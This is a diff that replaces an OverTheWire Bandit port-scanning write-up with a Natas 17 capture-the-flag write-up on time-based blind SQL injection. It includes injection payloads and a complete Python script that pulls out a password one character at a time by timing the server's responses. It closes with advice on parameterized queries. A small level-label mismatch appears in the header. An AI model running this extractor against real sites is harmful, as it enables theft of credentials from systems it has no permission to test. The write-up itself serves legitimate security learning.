@@ -1,118 +1,165 @@
-# OverTheWire Bandit: Level 16 → Level 17
+# Natas Level 17 — Writeup
 
-## Challenge Description
+**Challenge:** [OverTheWire Natas Wargame](http://natas.labs.overthewire.org/)
+**Level:** natas16 → natas17
+**Category:** Blind SQL Injection (Time-Based)
 
-> The credentials for the next level can be retrieved by submitting the password
-> of the current level to a **port on localhost in the range 31000 to 32000**.
-> First find out which of these ports have a server listening on them. Then find
-> out which of those speak SSL/TLS and which don't. There is only 1 server that
-> will give the next credentials, the others will simply send back to you
-> whatever you send to it.
+## Objective
 
-**Goal:** Scan the port range, find the one TLS service that accepts the current
-password, and use the credentials it returns to log in as `bandit17`.
+Find the password for `natas18` using only the `natas17` login form, without any visible error messages or output difference, meaning this is a **blind** SQL injection.
 
-**Connection:**
 
-    ssh bandit16@bandit.labs.overthewire.org -p 2220
+## Recon
 
-## Concepts Involved
+Visiting the Natas17 login page shows a simple username/password form. Checking the page source (or comparing with Natas16, its predecessor) reveals the backend query looks something like:
 
-- **Port scanning with `nmap`**: discovers which TCP ports are open and,
-  with `-sV`, tries to identify the service behind each one.
-
-- **SSL/TLS services**: only some of the open ports speak TLS, so we need to
-  tell them apart from plain-text services.
-
-- **`openssl s_client`**: TLS client used to talk to the encrypted services (as in Level 15 → 16).
-
-- **Echo servers**: some ports simply return whatever is sent to them, which
-  makes them look "working" even though they are not the target.
-
-- **SSH private keys**: the correct service returns a private key instead of a password.
-
-## Solution
-
-### Step 1: Scan the port range
-```bash
-    bandit16@bandit:~$ nmap -p 31000-32000 localhost
-
-Example output (your ports will differ):
-
-    PORT      STATE SERVICE
-    <port1>/tcp open  unknown
-    <port2>/tcp open  unknown
-    <port3>/tcp open  unknown
-    <port4>/tcp open  unknown
-    <port5>/tcp open  unknown
+```sql
+SELECT * FROM users WHERE username="$username" AND password="$password"
 ```
 
-Only a handful of ports in the range are open.
+Unlike previous levels, **this page shows no output at all**, no error messages, no "Wrong password" text, no login confirmation. This rules out classic error-based or boolean-based (content-diff) blind SQLi.
 
-### Step 2: Identify which ports speak SSL/TLS
+Since there's no visible signal in the response, the only usable side-channel is **response time** this points to a **time-based blind SQL injection**.
 
-Run service detection against the open ports:
 
-   ` bandit16@bandit:~$ nmap -sV -p 31000-32000 localhost`
+## Approach
 
-Ports reported as `ssl/unknown` speak TLS. Ports reported as plain `echo` or
-`unknown` do not. This narrows the candidates to a small list.
+The idea: inject a conditional `IF(...)` statement into the SQL query using `sleep(N)`. If the condition is true, the query pauses for `N` seconds before responding. By measuring response time, we can infer **true/false** answers about the database — one character at a time.
 
-### Step 3: Try the password on each TLS port
+### Payload structure
 
-Send the current password (bandit16's password) to each TLS candidate:
-```bash
-    bandit16@bandit:~$ cat /etc/bandit_pass/bandit16 | openssl s_client -connect localhost:<port> -quiet
-
-- Some ports simply **echo the password back**, which means they are not the target.
-- Exactly one port replies with `Correct!` followed by an **RSA private key**:
-
-      Correct!
-      -----BEGIN RSA PRIVATE KEY-----
-      <redacted>
-      -----END RSA PRIVATE KEY-----
+```sql
+username=natas18" AND IF(BINARY substring(password,1,N)='guess', sleep(5), 0) -- 
 ```
 
-> The `-quiet` option prevents `KEYUPDATE` / `RENEGOTIATING` issues if the
-> password starts with `R` or `k`.
+- `substring(password,1,N)` grabs the first `N` characters of the password.
+- `BINARY` forces a case-sensitive comparison (the password is alphanumeric, mixed case).
+- If our guessed prefix matches, the query sleeps → slow response = **match**.
+- If not, the query returns instantly → fast response = **no match**.
 
-### Step 4: Save the key and set safe permissions
+We brute-force this character by character, across the character set `[a-zA-Z0-9]` (previous Natas passwords are 32-char alphanumeric strings).
 
-The home directory is read-only, so work in a temporary directory:
 
-```bash
+## Problems Encountered
 
-    bandit16@bandit:~$ cd $(mktemp -d)
-    bandit16@bandit:/tmp/tmp.XXXXXXXXXX$ nano sshkey.private
+A naive implementation runs into false positives/negatives because:
 
-Paste the whole key (from `-----BEGIN RSA PRIVATE KEY-----` to
-`-----END RSA PRIVATE KEY-----`), save, and then restrict permissions, because
-SSH refuses keys that other users can read:
+1. **Network/server jitter** — the shared Natas server has variable latency, so a "fast" request can occasionally take longer than expected, and get misread as a match.
+2. **No confirmation step** — a single slow response isn't reliable proof; it needs to be repeated.
+3. **Missing `break`** — after finding a matching character, the loop must stop trying the rest of the charset for that position, or it may overwrite a correct guess with a bad one.
 
-    bandit16@bandit:/tmp/tmp.XXXXXXXXXX$ chmod 600 sshkey.private
+### Fix: Baseline calibration + majority voting
+
+To make the timing side-channel reliable:
+
+- **Calibrate a baseline** first, by sending a guaranteed-false condition (`IF(1=2, sleep(5), 0)`) and measuring normal response time.
+- Set the detection **threshold** above that baseline.
+- Require a character to register as "slow" **multiple times** (majority vote) before accepting it, and reject early if it fails twice.
+
+---
+
+## Final Script
+
+```python
+import requests
+import string
+import time
+from requests.auth import HTTPBasicAuth
+
+basicAuth = HTTPBasicAuth('natas17', 'natas17_password')
+headers = {'Content-Type': 'application/x-www-form-urlencoded'}
+
+u = "http://natas17.natas.labs.overthewire.org/index.php?debug"
+
+password = ""
+count = 1
+PASSWORD_LENGTH = 32
+VALID_CHARS = string.digits + string.ascii_letters
+
+SLEEP_TIME = 5
+VOTES_NEEDED = 3
+MAX_ROUNDS_PER_CHAR = 5
+
+def measure(payload):
+    try:
+        r = requests.post(u, data=payload, headers=headers, auth=basicAuth, verify=False, timeout=15)
+        return r.elapsed.total_seconds()
+    except requests.exceptions.RequestException as e:
+        print("  request error:", e)
+        return 0
+
+def get_baseline():
+    payload = "username=natas18\" AND IF(1=2, sleep(%d), 0) -- " % SLEEP_TIME
+    times = [measure(payload) for _ in range(3)]
+    return max(times)
+
+print("Calibrating baseline...")
+baseline = get_baseline()
+threshold = max(baseline + 1.5, SLEEP_TIME * 0.5)
+print(f"Baseline latency: {baseline:.2f}s, threshold set to: {threshold:.2f}s")
+
+def try_char(password, count, c):
+    payload = ("username=natas18\" AND "
+               f"IF(BINARY substring(password,1,{count})='{password}{c}', sleep({SLEEP_TIME}), 0)"
+               " -- ")
+    votes = 0
+    checks = 0
+    while checks < VOTES_NEEDED + 1:
+        elapsed = measure(payload)
+        checks += 1
+        if elapsed > threshold:
+            votes += 1
+        if votes >= VOTES_NEEDED:
+            return True
+        if checks - votes >= 2:
+            return False
+    return votes >= VOTES_NEEDED
+
+def try_position(password, count):
+    for c in VALID_CHARS:
+        if try_char(password, count, c):
+            return c
+    return None
+
+while count <= PASSWORD_LENGTH:
+    found_char = None
+    for attempt in range(1, MAX_ROUNDS_PER_CHAR + 1):
+        found_char = try_position(password, count)
+        if found_char:
+            break
+        print(f"  Position {count}: round {attempt} failed, retrying...")
+        time.sleep(1)
+
+    if found_char:
+        password += found_char
+        count += 1
+        print("Found one more char : %s" % password)
+    else:
+        print("No character matched at position %d after %d rounds. Stopping." % (count, MAX_ROUNDS_PER_CHAR))
+        break
+
+print("Done! Final password:", password)
 ```
 
-### Step 5: Log in as bandit17
-```bash
+## Result
 
-    bandit16@bandit:/tmp/tmp.XXXXXXXXXX$ ssh -i sshkey.private bandit17@localhost -p 2220
-```
+Running the script against `natas17` successfully extracted the 32-character `natas18` password one character at a time via timing side-channel, which was then used to log in as `natas18`.
 
-### Step 6: Read the password
-```bash
-
-    bandit17@bandit:~$ cat /etc/bandit_pass/bandit17
-    <Natas17_password>
-```
 
 ## Key Takeaways
 
-- Combine tools: `nmap` to discover services, `openssl s_client` to talk to TLS ones.
+- **Blind SQLi doesn't always mean boolean-based** — when there's no visible content difference, response timing is a valid alternative side-channel.
+- **Timing attacks are noisy in the real world.** A script that works in theory needs baseline calibration and repeated confirmation to be reliable against real network conditions.
+- **`BINARY` keyword matters** for case-sensitive string comparisons in MySQL, without it, `substring` comparisons default to case-insensitive collation, which can produce false positives.
+- Always **break out of the inner loop** immediately after a confirmed match continuing to test other characters at the same position risks corrupting already-correct data.
 
-- Not every open port is useful. Echo services are decoys, so always verify the response.
 
-- A service may return a **private key** instead of a password. Save it carefully
-  and set permissions to `600` before using it with `ssh -i`.
+## Mitigation (Defensive Takeaway)
 
-- Keep scans narrow (only the stated range) and run them only against `localhost`.
+This vulnerability exists because user input is concatenated directly into a SQL query. The fix, as always with SQL injection:
 
+- Use **parameterized queries / prepared statements** instead of string concatenation.
+- Never trust the timing of a response either even parameterized apps should avoid exposing conditional logic driven directly by untrusted input.
+
+
+*Writeup for educational purposes as part of the OverTheWire Natas wargame series.*
